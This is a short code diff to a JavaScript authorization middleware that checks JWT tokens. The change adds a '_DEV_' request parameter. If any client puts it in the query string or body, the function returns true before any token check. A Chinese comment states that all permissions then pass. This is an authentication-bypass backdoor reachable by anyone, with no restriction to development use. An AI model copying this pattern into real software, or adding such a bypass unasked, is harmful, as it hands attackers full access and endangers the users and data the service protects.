@@ -21,7 +21,15 @@ function _authToken (req) {
 
 // 验证权限
 module.exports = async (ctx) => {
-  const token = _authToken(ctx.request)
+  const { request } = ctx
+  const _DEV_ = request.query._DEV_ || request.body._DEV_ || false
+  
+  // 如果请求时query或者body上加上_DEV_，则全部权限都通过
+  if (_DEV_) {
+    return true
+  }
+
+  const token = _authToken(request)
   if (token) {
     try {
       const decodedToken = await jwt.verify(token, config.AUTH.SECRET_KEY)
